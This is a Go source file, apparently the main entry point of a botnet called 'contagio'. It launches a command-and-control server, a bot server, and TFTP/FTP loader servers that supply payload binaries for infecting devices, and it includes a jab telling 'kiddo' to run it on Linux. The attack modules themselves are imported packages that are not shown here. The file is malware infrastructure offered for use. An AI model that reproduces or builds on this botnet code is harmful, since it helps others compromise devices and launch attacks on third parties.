package main

import (
	"contagio/contagio/bot_server"
	"contagio/contagio/cnc"
	"contagio/contagio/cnc/database"
	"contagio/contagio/config"
	loader "contagio/contagio/loader_server"
	"fmt"
	"os"
	"runtime"
	"sync"
)

var wg sync.WaitGroup

func main() {

	if runtime.GOOS != "linux" {
		fmt.Println("Stupid kiddo run this on linux...")
		return
	}

	c := config.ReadConfig(&wg)
	if c == nil {
		return
	}

	if len(os.Args) > 1 {
		if os.Args[1] == "docker_loader" {

			wg.Add(1)
			loader.GetArchs(&wg)

			go loader.StartLoader(c)
			go loader.StartTftp(c)
			go loader.StartFtp(c)
			wg.Wait()
		}
		if os.Args[1] == "docker_cnc" {
			database.InitDb(false)
			wg.Add(1)
			go cnc.StartCnc(c)
			go bot_server.StartBotServer(c)
			wg.Wait()
		}
	} else {
		database.InitDb(false)

		wg.Add(1)
		loader.GetArchs(&wg)

		go loader.StartLoader(c)
		go loader.StartTftp(c)
		go loader.StartFtp(c)
		go cnc.StartCnc(c)
		go bot_server.StartBotServer(c)
		wg.Wait()

	}
}
